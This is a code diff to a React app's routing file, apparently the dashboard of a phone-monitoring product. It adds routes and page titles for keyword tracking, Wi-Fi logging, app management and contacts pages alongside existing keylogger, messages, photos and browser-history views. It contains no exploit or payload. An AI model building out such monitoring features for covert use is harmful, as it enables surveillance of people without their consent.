@@ -18,6 +18,10 @@ import MessagesPage from './pages/phone_data/MessagesPage';
 import PhotosPage from './pages/phone_data/PhotosPage';
 import BrowserHistoryPage from './pages/phone_data/BrowserHistoryPage';
 import KeyloggerPage from './pages/phone_data/KeyloggerPage';
+import TrackKeywordsPage from './pages/phone_data/TrackKeywordsPage';
+import WiFiLoggerPage from './pages/phone_data/WiFiLoggerPage';
+import AppManagementPage from './pages/phone_data/AppManagementPage';
+import ContactsPage from './pages/phone_data/ContactsPage';
 
 function MainLayout() {
   const location = useLocation();
@@ -40,6 +44,10 @@ function MainLayout() {
     if (pathname.includes('/photos')) return 'Photos';
     if (pathname.includes('/browser_history')) return 'Browser History';
     if (pathname.includes('/keylogger')) return 'Keylogger';
+    if (pathname.includes('/track_keywords')) return 'Track Keywords';
+    if (pathname.includes('/wifi_logger')) return 'Wi-Fi Logger';
+    if (pathname.includes('/app_management')) return 'App Management';
+    if (pathname.includes('/contacts')) return 'Contacts';
     return 'Dashboard';
   };
 
@@ -92,6 +100,14 @@ function MainLayout() {
             <Route path="/browser_history" element={<BrowserHistoryPage />} />
             <Route path="/phonedata/keylogger" element={<KeyloggerPage />} />
             <Route path="/keylogger" element={<KeyloggerPage />} />
+            <Route path="/phonedata/track_keywords" element={<TrackKeywordsPage />} />
+            <Route path="/track_keywords" element={<TrackKeywordsPage />} />
+            <Route path="/phonedata/wifi_logger" element={<WiFiLoggerPage />} />
+            <Route path="/wifi_logger" element={<WiFiLoggerPage />} />
+            <Route path="/phonedata/app_management" element={<AppManagementPage />} />
+            <Route path="/app_management" element={<AppManagementPage />} />
+            <Route path="/phonedata/contacts" element={<ContactsPage />} />
+            <Route path="/contacts" element={<ContactsPage />} />
           </Routes>
         </main>
       </div>
